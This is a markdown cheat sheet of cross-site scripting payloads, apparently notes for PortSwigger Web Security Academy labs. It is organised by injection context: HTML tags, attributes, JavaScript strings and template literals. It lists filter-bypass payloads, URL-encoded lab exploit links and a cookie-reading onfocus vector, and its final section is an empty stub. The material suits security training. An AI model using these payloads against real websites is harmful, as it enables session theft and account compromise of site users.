# XSS Context

***

### Between HTML Tags

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

#### If most tags and attributes blocked

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

// %3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
```

#### If all attributes and tags blocked (URL)

```html
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

// %3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

#### If SVG Allowed

```html
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

// %22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```

***

### In HTML Tags Attributes

```html
"><script>alert(document.domain)</script>
" autofocus onfocus=alert(document.domain) x="
<a href="javascript:alert(document.domain)">
```

#### Reflected XSS in Canonical Link Tags

```html
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

// %27accesskey=%27x%27onclick=%27alert(1)
```

#### If angle brackets encoded

```javascript
"onmouseover="alert(1)
```

#### Into \`href\` attributes

```javascript
javascript:alert(1)
```

***

### XSS Into Javascript

```html
</script><img src=1 onerror=alert(document.domain)>
```

#### If single quotes and backslash escaped

```html
</script><script>alert(1)</script>
```

#### If angle brackets HTML encoded

```javascript
'-alert(document.domain)-'
';alert(document.domain)//
```

#### If angle brackets and double quotes encoded, single quotes escaped

```javascript
For example, suppose that the input:

';alert(document.domain)//
gets converted to:

\';alert(document.domain)//
You can now use the alternative payload:

\';alert(document.domain)//
which gets converted to:

\\';alert(document.domain)//
```

#### Call function without parenthesis

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

// %27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

#### If angle brackets and double quotes HTML-encoded, single quotes and backslash escaped

```html
// If the context like this
<a href="#" onclick="... var input='controllable data here'; ...">

// This way to break out
&apos;-alert(document.domain)-&apos;
```

#### In Javascript template literals

```html
// The context
<script>
...
var input = `controllable data here`;
...
</script>

// The breaker
${alert(document.domain)}
```

***

### XSS via Client-Side Template Injection

[imported](imported/ "mention")
